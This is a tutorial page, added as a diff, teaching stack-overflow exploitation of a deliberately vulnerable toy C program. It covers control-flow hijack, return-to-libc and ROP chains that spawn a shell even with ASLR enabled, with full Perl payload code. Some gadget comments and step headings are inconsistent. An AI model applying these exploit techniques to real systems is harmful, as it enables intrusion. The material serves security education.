@@ -1,0 +1,740 @@
+<meta charset="utf-8"><!-- -*- markdown -*- -->
+    **Simple return-to-libc and ROP**
+
+We're going to walk through a simple `memcpy` stack buffer overflow attack,
+exploiting it several ways.
+
+
+To get started, create a file called example3.c with the vulnerable code:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void bar() {
+  system("/bin/sh");
+}
+
+void func(char *str,size_t len) {
+  char buf[10];
+  memcpy(buf,str,len);
+}
+
+int main(int argc, char**argv) {
+  size_t len = strtol(argv[1], NULL, 10);
+  func(argv[2], len);
+  return 0;
+}
+```
+
+The vulnerable function is `func`, which happily copies `len` bytes (the first
+program argument) from `str` (the second program argument) into `buf` (which is
+only 10 bytes long).
+
+As in our previous [stack smashing post](bufferoverflow.html), let's compile
+this program with GCC:
+
+```
+gcc -m32 -O0 -ggdb -static -U_FORTIFY_SOURCE -fno-stack-protector \
+    -zexecstack -no-pie -o example3 example3.c
+```
+
+Hijack control flow to `bar()`
+-----------------------
+
+Our first goal is to manually modify the stack frames to change the return
+address in `func` to return to the beginning of `bar`, instead of returning
+back to `main`.
+
+In other words, we want the stack frame to change from:
+
+```
+│ len        |           →    │ len        |
+│ str        |           →    │ str        |
+│ saved $eip |           →    │ &bar       |
+│ saved $ebp | ← $ebp    →    │ AAAA       | ← $ebp
+| ...        |           →    | AAAA       |
+│ buf        | ← $esp    →    │ AAAA       | ← $esp
+```
+
+To do this, we need to know the location of `bar`. You can get it with GDB,
+`objdump` or `nm`:
+
+```
+$ objdump -d example3 | grep \<bar\>
+08049865 <bar>:
+```
+
+We also need to know how many bytes we need to write on the stack to get to the
+`saved $eip` slot.  Within GDB let's set a breakpoint on `func` and run the
+program with arguments `4 "AAAA"` (we need to supply arguments for the program
+to not crash):
+
+```
+> b func
+> set args 4 "AAAA"
+> r
+```
+
+A little bit of math will tell us how many bytes we need to supply to buff to
+overwrite everything up to (but not including) the saved `$eip`:
+
+```
+> p $ebp-&buf[0]+4
+$8 = 0x16
+```
+
+That's all we need! Let's now run with our payload:
+
+```
+./example3 100 `perl -e "print ('A' x 0x16); print pack('I!', 0x08049865);"`
+sh-5.1$
+```
+
+Voila!
+
+The bytes we write to `buf` (the second argument) are produced by a Perl script
+that first prints `'A'` 22 times and then the address of bar:
+
+```
+$ perl -e "print ('A' x 0x16); print pack('I!', 0x08049865);" | xxd -p
+4141414141414141414141414141414141414141414165980408
+```
+
+The `pack` function conveniently packed the address of bar with the proper
+endianess.
+
+
+return-to-libc
+-----------------------
+
+We won't always have a convenient `bar` to call. But there might be a
+convenient libc function like `system` that we can call. So, let's carry out a
+return-to-libc attack by calling system with the `"/bin/bash"` argument.
+
+For this attack, we're going to turn off ASLR:
+
+```
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+Let's also create a helper script `pwn.pl` where we'll implement the remaining
+attacks:
+
+```perl
+#!/usr/bin/perl
+
+sub usage { return "Usage: $0 bar|libc-1|libc-2|rop-1|rop-2|rop-3\n"; }
+
+$buf_base = 0xffffcc06;  # &buf[0] in func()
+$system   = 0x08052770;  # nm example3 | grep __libc_system
+$bar      = 0x08049865;  # nm example3 | grep bar
+
+sub p { return pack('I!', $_[0]); }
+
+
+$example = shift or die usafe();
+if ($example =~ /^bar$/i) {
+  # 0.1 ... return-to-bar example ...
+  $stack = ('A' x 0x16);
+  $stack .= p($bar);
+} elsif ($example =~ /^libc-1$/i) {
+  # 0.2 ... First return-to-libc example ...
+} elsif ($example =~ /^libc-2$/i) {
+  # 0.2 ... Second return-to-libc example ...
+} elsif ($example =~ /^rop-1$/i) { 
+  # 0.3 ... First ROP example ...
+} elsif ($example =~ /^rop-2$/i) { 
+  # 0.3 ... Second ROP example ...
+} elsif ($example =~ /^rop-3$/i) { 
+  # 0.4 ... Final ROP example ...
+} else {
+  die usage();
+}
+
+print $stack;
+```
+
+This script already has a few variables defined; the comment explains what they
+are. The most interesting one is the buffer base (`$buf_base`): I leave it as
+an exercise for you to figure out how we can figure out this address.
+
+I've already populated the attack from the previous section.  Now you can carry
+out the attack with a slightly cleaner script:
+
+```
+./example3 100 `perl pwn.pl bar`
+sh-5.1$
+```
+
+Let's fill in the first return-to-libc example. We're going to overflow the
+stack by writing the `"/bin/bash"` to the buffer and then set up the call frame
+for `system` to have the system argument point to this string (the start of
+`buf`). Specifically, our stack will look like this:
+
+```
+│ len        |           →    │ &buf         |
+│ str        |           →    │ 0xdeadbeef   |
+│ saved $eip |           →    │ &system      |
+│ saved $ebp | ← $ebp    →    │ AAAA         | ← $ebp
+| ...        |           →    | AAAA         |
+│ buf        | ← $esp    →    │ /bin/bash\0  | ← $esp
+```
+
+The code we need to write is pretty similar to the figure:
+
+```perl
+...
+} elsif ($example =~ /^libc-1$/i) {
+  # 0.2 ... First return-to-libc example ...
+  $stack  = "\/bin\/bash\0";
+  $stack .= 'A' x (0x16-length($stack));
+  $stack .= p($system);
+  $stack .= p(0xdeadbeef);
+  $stack .= p($buf_base);
+} elsif ($example =~ /^libc-2$/i) {
+...
+```
+
+You'll note that Perl conveniently lets us concatenate the payload one step at
+a time: the `/bin/bash` string, enough `A` to get fill the stack up to the
+saved `$eip$, then the address of `system()`, the address we want system to
+return to (`0xdeadbeef`), and the argument (`&buf[0]`).
+
+And, pwn:
+
+```
+./example3 100 `perl pwn.pl libc-1`
+$
+```
+
+You won't always have a big enough buffer to fit your string at the start.
+Moreover this part of memory may be clobbered by future stack frames. But you
+typically have space at the end. So let's make that work. For this, we'll want
+our stack to look like this:
+
+```
+│            |           →    │ /bin/bash\0  |◂─╮
+│ len        |           →    │ &bash_str    |──╯
+│ str        |           →    │ 0xdeadbeef   |
+│ saved $eip |           →    │ &system      |
+│ saved $ebp | ← $ebp    →    │ AAAA         | ← $ebp
+| ...        |           →    | AAAA         |
+│ buf        | ← $esp    →    │ AAAA         | ← $esp
+```
+
+```perl
+...
+} elsif ($example =~ /^libc-2$/i) {
+  # 0.2 ... Second return-to-libc example ...
+  $stack = ('A' x 0x16);
+  $stack .= p($system);
+  $stack .= p(0xdeadbeef);
+  $stack .= p($buf_base+length($stack)+4); # address of string on the stack
+  $stack .= '/bin/bash';
+} elsif ($example =~ /^rop-1$/i) { 
+...
+```
+
+This payload is the same, but the string is the very last thing we push on the
+stack. And right before it we compute its address `$buf_base+length($stack)+4`.
+
+You can run this as usual:
+
+```
+./example3 100 `perl pwn.pl libc-2`
+$
+```
+
+ROP (system)
+-----------------------
+
+We're going to build up to a real ROP attack piecemeal. Our first two payloads
+will still call `system`. The first is very similar to the above payload, but
+uses two gadgets: one gadget to pop the address of `system` into register
+`$edi`; another to `call $edi`.
+
+We're going to use ropper to find these gadgets:
+
+```
+$  ropper --file example3 --search "pop edi; ret;"
+0x08049a90: pop edi; ret;
+
+$ ropper --file example3 --search "call edi"
+0x08055281: call edi;
+```
+
+Our goal is to make the payload look like this:
+
+```
+│ /bin/bash\0  |◂─╮
+│ &bash_str    |──╯
+│ 0x08055281   | → call edi;
+│ &system      |
+│ 0x08049a90   | → pop edi; ret;
+│ AAAA         | ← $ebp
+| AAAA         |
+│ AAAA         | ← $esp
+```
+
+The implementation is almost identical:
+
+```
+...
+} elsif ($example =~ /^rop-1$/i) { 
+  # 0.3 ... First ROP example ...
+  $stack = ('A' x 0x16);
+  $stack .= p(0x08049a90); # pop edi; ret;
+  $stack .= p($system);
+  $stack .= p(0x08055281); # call edi;
+  $stack .= p($buf_base+length($stack)+4); # address of string on the stack
+  $stack .= '/bin/bash';
+} elsif ($example =~ /^rop-2$/i) { 
+...
+```
+
+You can run this as usual:
+
+```
+./example3 100 `perl pwn.pl rop-1`
+$
+```
+
+Let's make this more interesting and turn on ASLR:
+
+```
+$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+With the exception of the `bar` payload, your attacks should no longer really
+work since the `$buf_base` will be different every time we run the program.  We
+don't need this if we can find a gadget that leaks `$esp` so we can compute the
+location of `/bin/bash` ourselves.
+
+Lucky for us, this gadget does exist! ropper will offer you a few; here is a
+relatively simple one:
+
+```
+0x0807df05:  push esp; call eax;
+```
+
+This gadget ends in a `call` (`ret` would not be so useful since it would just
+eat up the value written on the stack). To get the value off the stack we need
+to point `$eax` to a gadget that pops the `$esp` off the stack. With ropper we
+can find:
+
+```
+0x0806df0d: pop esi; pop edi; pop ebx; ret;
+```
+
+This pops three values off the stack; we really only care about one so we'll
+pad the stack with one `0xdeadbeef`. We don't need to pad the stack with two
+because the `call eax` will push the saved `$eip` to the stack. When we
+execute this gadget the stack will look something like this:
+
+```
+│ 0xdeadbeef   | → $ebx
+│ saved $esp   | → $edi
+│ saved $eip   | → $esi
+```
+
+In other words `$edi` will have our stack base.
+
+To use this gadget we also need to make sure `$eax` points to `0x0806df0d`. We
+can do this with another gadget:
+
+```
+0x080b265a: pop eax; ret;
+```
+
+Put together our payload looks like this so far:
+
+```
+│ /bin/bash\0  |
+│ ...          |  
+│ 0xdeadbeef   |  
+│ 0x0807df05   | → push esp; call eax;
+│ 0x0806df0d   |   address of gadget (pop esi; pop edi; pop ebx; ret;)
+│ 0x080b265a   | → pop eax; ret;
+│ AAAA         | ← $ebp
+| AAAA         |
+│ AAAA         | ← $esp
+```
+
+Since we're going to call put the `/bin/bash` string at the end, we need to
+compute the address of this string relative to the base. For this we need an
+add gadget. There is a good gadget here:
+
+```
+0x0806b623: add eax, edx; ret;
+```
+
+To use this, we'll move the value stored in `$edi` into `$eax` and write our
+constant offset into `$edx`. We need three gadgets:
+
+1. A `edx = eax` gadget:
+
+```
+│ 0xdeadbeef   |  
+│ 0x08068444   | → mov edi, eax; pop edi; ret;
+```
+
+2. A `edx = offset` gadget:
+
+```
+| 0xdeadbeef   |
+| 0xdeadbeef   |
+| offset       |
+| 0x08060e86   | → pop edx; pop ebx; pop esi; ret;
+```
+
+3. A `eax += eax` gadget:
+
+```
+| 0x0806b623   | → add eax, edx; ret;
+```
+
+At this point `$eax` will point to the string (we figure out the `offset` in
+GDB). We just need to push this to the stack and call `system`; we have a
+gadget that will do just this:
+
+```
+| 0x08055064)  | → push eax; call esi;
+| &system      | 
+| 0x080496c9   | → pop esi; ret;
+```
+
+Putting this all together:
+
+```
+│ /bin/bash\0  |
+-- system($eax):
+| 0x08055064)  | → push eax; call esi;
+| &system      | 
+| 0x080496c9   | → pop esi; ret;
+-- $eax += $edx:
+| 0x0806b623   | → add eax, edx; ret;
+-- $edx = offset:
+| 0xdeadbeef   |
+| 0xdeadbeef   |
+| offset       |
+| 0x08060e86   | → pop edx; pop ebx; pop esi; ret;
+-- $eax = $edi:
+│ 0xdeadbeef   |  
+│ 0x08068444   | → mov edi, eax; pop edi; ret;
+-- $edi = $esp:
+│ 0xdeadbeef   |  
+│ 0x0807df05   | → push esp; call eax;
+│ 0x0806df0d   |   address of gadget (pop esi; pop edi; pop ebx; ret;)
+│ 0x080b265a   | → pop eax; ret;
+--
+│ AAAA         | ← $ebp
+| AAAA         |
+│ AAAA         | ← $esp
+```
+
+In Perl (with `offset = 0x2c`):
+
+```
+...
+} elsif ($example =~ /^rop-2$/i) { 
+  # 0.3 ... Second ROP example ...
+  $stack = ('A' x 0x16);
+  $stack .= p(0x080b265a); # pop eax; ret;
+  $stack .= p(0x0806df0d); #                                 # eax = 0x0806df0d -> pop esi; pop edi; pop ebx; ret;
+  $stack .= p(0x0807df05); # push esp; call eax;             # after the call edi = esp we pushed
+  $stack .= p(0xdeadbeef); #                                 
+  $stack .= p(0x08068444); # mov edi, eax; pop edi; ret;     # eax = edi
+  $stack .= p(0xdeadbeef); #
+  $stack .= p(0x08060e86); # pop edx; pop ebx; pop esi; ret;
+  $stack .= p(0x0000002c); #                                 # edx = difference between esp and /bin/bash string at end of payload
+  $stack .= p(0xdeadbeef); #
+  $stack .= p(0xdeadbeef); #
+  $stack .= p(0x0806b623); # add eax, edx; ret;              # eax now points to /bin/bash string
+  $stack .= p(0x080496c9); # pop esi; ret;
+  $stack .= p($system);    # address of system               # esi = &system
+  $stack .= p(0x08055064); # push eax; call esi;
+  $stack .= '/bin/bash';
+} elsif ($example =~ /^rop-3$/i) { 
+...
+
+```
+
+And, even with ASLR enabled, we can now get shell:
+
+```
+./example3 100 `perl pwn.pl rop-2`
+$
+```
+
+ROP (execve)
+-----------------------
+
+In our final example, we will eliminate our final cheat: calling `system`.
+Instead we're going to perform a system call directly. In particular, we're
+going to call `execve("/bin/bash",0,0)` directly. Since we're making a syscall
+we're going to have to follow Linux 32's calling convention.
+
+Taking the type of `excve`:
+
+```
+int execve(const char *path, char *const argv[], char *const envp[]);
+```
+
+this translates to setting:
+
+```
+$eax = path (address of /bin/bash string)
+$ebx = system call number (0xb for execve)
+$ecx = argv (null)
+$edx = envp (null)
+```
+
+We're going to build on our previous example, but create some helper functions
+to abstract our gadgets. 
+
+> Note: In this subsection we're using Intel syntax. I extracted the gadgets
+> with ropper and converting to ATT will just make it harder for you to search.
+
+First, we're going to create a gadget for getting the address of the
+`/bin/bash` string (in Perl `$_[0]` is the first argument):
+
+```perl
+  # $eax = $esp+$_[0]
+  # clobbers: $esi, $edi, $ebx, $edx
+  sub set_eax_to_str {
+    # $edi = $esp:
+    $stack .= p(0x080b265a); # pop eax; ret;
+    $stack .= p(0x0806df0d); # 0x0806df0d -> pop esi; pop edi; pop ebx; ret;
+    $stack .= p(0x0807df05); # push esp; call eax;
+    $stack .= p(0xdeadbeef); #                                 
+    # $eax = $edi:
+    $stack .= p(0x08068444); # mov edi, eax, edi; pop edi; ret;
+    $stack .= p(0xdeadbeef); #
+    # $edx = offset (difference between esp and /bin/bash string at end of payload):
+    $stack .= p(0x08060e86); # pop edx; pop ebx; pop esi; ret;
+    $stack .= p($_[0]);      # offset
+    $stack .= p(0xdeadbeef); #
+    $stack .= p(0xdeadbeef); #
+    # $eax += $edx:
+    $stack .= p(0x0806b623); # add eax, edx; ret;
+  }
+```
+
+Since we need to set `$ebx` to the path, we also need a gadget to move `$eax`
+to `$ebx`:
+
+```perl
+  # $ebx = $eax
+  # clobbers: $esi
+  sub set_ebx_to_eax {
+    $stack .= p(0x080496c9); # pop esi; ret;
+    $stack .= p(0x08065e3c); # esi -> pop esi; pop ebx; ret;
+    $stack .= p(0x08055064); # push eax; call esi;
+  }
+```
+
+We need a gadget to clear `$edx`:
+
+```perl
+  # $edx = 0
+  # clobbers: $edi, $ebp, $eax
+  sub clear_edx {
+    $stack .= p(0x08059849); # mov edx, 0xffffffff; ret;
+    $stack .= p(0x08049a90); # pop edi; ret;
+    $stack .= p(0xffffffff);
+    $stack .= p(0x08056e82); # sub edx, edi; pop edi; pop ebp; mov eax, edx; ret;
+    $stack .= p(0xdeadbeef);
+    $stack .= p(0xdeadbeef);
+  }
+```
+
+We need a gadget to set `$eax` to the syscall number:
+  
+```perl
+  # $eax = $_[]
+  # clobbers: $esi, $esi, $edi
+  sub set_eax {
+    $stack .= p(0x080496c9); # pop esi; ret;                            
+    $stack .= p($_[0]);
+    $stack .= p(0x0806b6b3); # mov eax, esi; pop esi; pop edi; ret;
+    $stack .= p(0xdeadbeef);
+    $stack .= p(0xdeadbeef);
+  }
+```
+
+We also need a gadget to clear `$ecx`, but conveniently, we have a gadget that
+clears `$ecx` and then performs the syscall:
+
+```
+0x0804af6f: xor ecx, ecx; int 0x80;
+```
+
+We can now put all of these together:
+
+```perl
+  # $ebx -> /bin/bash:
+  set_eax_to_str(0x0000005c); # 0x5c is the offset (computed in gdb)
+  set_ebx_to_eax();
+  # $edx = 0:
+  clear_edx();
+  # $eax = 0xb (execve syscall number; grep xecve /usr/include/asm/unistd_32.h)
+  set_eax(0x0000000b);
+  # $ecx = 0; int 0x80:
+  $stack .= p(0x0804af6f); # xor ecx, ecx; int 0x80;
+  $stack .= '/bin/bash';
+```
+
+The order of these calls matters since each gadget clobbers certain registers.
+So, for example, clearing `$edx` before setting `$eax` wouldn't work because
+`set_eax_to_str` clobbers `$edx`.
+
+But abstracting gadgets like so makes it relatively easy to put a payload
+together. And like before, we can put this payload to use:
+
+```
+./example3 300 `perl pwn.pl rop-3`
+```
+
+That's it!
+
+
+Full source
+-----------------------
+
+All source files are [here](rop-src). The full source for `pwn.pl`:
+
+```perl
+#!/usr/bin/perl
+
+sub usage { return "Usage: $0 bar|libc-1|libc-2|rop-1|rop-2|rop-3\n"; }
+
+$buf_base = 0xffffcc06;  # &buf[0] in func()
+$system   = 0x08052770;  # nm example3 | grep __libc_system
+$bar      = 0x08049865;  # nm example3 | grep bar
+
+sub p { return pack('I!', $_[0]); }
+
+
+$example = shift or die usafe();
+if ($example =~ /^bar$/i) {
+  # 0.1 ... return-to-bar example ...
+  $stack = ('A' x 0x16);
+  $stack .= p($bar);
+} elsif ($example =~ /^libc-1$/i) {
+  # 0.2 ... First return-to-libc example ...
+  $stack  = "\/bin\/bash\0";
+  $stack .= 'A' x (0x16-length($stack));
+  $stack .= p($system);
+  $stack .= p(0xdeadbeef);
+  $stack .= p($buf_base);
+} elsif ($example =~ /^libc-2$/i) {
+  # 0.2 ... Second return-to-libc example ...
+  $stack = ('A' x 0x16);
+  $stack .= p($system);
+  $stack .= p(0xdeadbeef);
+  $stack .= p($buf_base+length($stack)+4); # address of string on the stack
+  $stack .= '/bin/bash';
+} elsif ($example =~ /^rop-1$/i) { 
+  # 0.3 ... First ROP example ...
+  $stack = ('A' x 0x16);
+  $stack .= p(0x08049a90); # pop edi; ret;
+  $stack .= p($system);
+  $stack .= p(0x08055281); # call edi;
+  $stack .= p($buf_base+length($stack)+4); # address of string on the stack
+  $stack .= '/bin/bash';
+} elsif ($example =~ /^rop-2$/i) { 
+  # 0.3 ... Second ROP example ...
+  $stack = ('A' x 0x16);
+  $stack .= p(0x080b265a); # pop eax; ret;
+  $stack .= p(0x0806df0d); #                                 # eax = 0x0806df0d -> pop esi; pop edi; pop ebx; ret;
+  $stack .= p(0x0807df05); # push esp; call eax;             # after the call edi = esp we pushed
+  $stack .= p(0xdeadbeef); #                                 
+  $stack .= p(0x08068444); # mov eax, edi; pop edi; ret;     # eax = edi
+  $stack .= p(0xdeadbeef); #
+  $stack .= p(0x08060e86); # pop edx; pop ebx; pop esi; ret;
+  $stack .= p(0x0000002c); #                                 # edx = difference between esp and /bin/bash string at end of payload
+  $stack .= p(0xdeadbeef); #
+  $stack .= p(0xdeadbeef); #
+  $stack .= p(0x0806b623); # add eax, edx; ret;              # eax now points to /bin/bash string
+  $stack .= p(0x080496c9); # pop esi; ret;
+  $stack .= p($system);    # address of system               # esi = &system
+  $stack .= p(0x08055064); # push eax; call esi;
+  $stack .= '/bin/bash';
+} elsif ($example =~ /^rop-3$/i) { 
+  # 0.4 ... Final ROP example ...
+  # Note the assembly in comments is in Intel style (ropper default)
+
+  # $eax = $esp+$_[0]
+  # clobbers: $esi, $edi, $ebx, $edx
+  sub set_eax_to_str {
+    # $edi = $esp:
+    $stack .= p(0x080b265a); # pop eax; ret;
+    $stack .= p(0x0806df0d); # 0x0806df0d -> pop esi; pop edi; pop ebx; ret;
+    $stack .= p(0x0807df05); # push esp; call eax;
+    $stack .= p(0xdeadbeef); #                                 
+    # $eax = $edi:
+    $stack .= p(0x08068444); # mov edi, eax, edi; pop edi; ret;
+    $stack .= p(0xdeadbeef); #
+    # $edx = offset (difference between esp and /bin/bash string at end of payload):
+    $stack .= p(0x08060e86); # pop edx; pop ebx; pop esi; ret;
+    $stack .= p($_[0]);      # offset
+    $stack .= p(0xdeadbeef); #
+    $stack .= p(0xdeadbeef); #
+    # $eax += $edx:
+    $stack .= p(0x0806b623); # add eax, edx; ret;
+  }
+
+  # $ebx = $eax
+  # clobbers: $esi
+  sub set_ebx_to_eax {
+    $stack .= p(0x080496c9); # pop esi; ret;
+    $stack .= p(0x08065e3c); # esi -> pop esi; pop ebx; ret;
+    $stack .= p(0x08055064); # push eax; call esi;
+  }
+
+  # $edx = 0
+  # clobbers: $edi, $ebp, $eax
+  sub clear_edx {
+    $stack .= p(0x08059849); # mov edx, 0xffffffff; ret;
+    $stack .= p(0x08049a90); # pop edi; ret;
+    $stack .= p(0xffffffff);
+    $stack .= p(0x08056e82); # sub edx, edi; pop edi; pop ebp; mov eax, edx; ret;
+    $stack .= p(0xdeadbeef);
+    $stack .= p(0xdeadbeef);
+  }
+  
+  # $eax = $_[]
+  # clobbers: $esi, $esi, $edi
+  sub set_eax {
+    $stack .= p(0x080496c9); # pop esi; ret;                            
+    $stack .= p($_[0]);
+    $stack .= p(0x0806b6b3); # mov eax, esi; pop esi; pop edi; ret;
+    $stack .= p(0xdeadbeef);
+    $stack .= p(0xdeadbeef);
+  }
+
+  $stack = ('A' x 0x16);
+  # $ebx -> /bin/bash:
+  set_eax_to_str(0x0000005c); # 0x5c is the offset (computed in gdb)
+  set_ebx_to_eax();
+  # $edx = 0:
+  clear_edx();
+  # $eax = 0xb (execve syscall number; grep xecve /usr/include/asm/unistd_32.h)
+  set_eax(0x0000000b);
+  # $ecx = 0; int 0x80:
+  $stack .= p(0x0804af6f); # xor ecx, ecx; int 0x80;
+  $stack .= '/bin/bash';
+} else {
+  die usage();
+}
+
+print $stack;
+```
+
+<style class="fallback">body{visibility:hidden;white-space:pre;font-family:monospace}</style><script src="../markdeep.min.js"></script>
+<script>
+  window.alreadyProcessedMarkdeep || (document.body.style.visibility="visible");
+  markdeepOptions= {tocStyle: 'none', sortScheduleLists: false };
+</script>
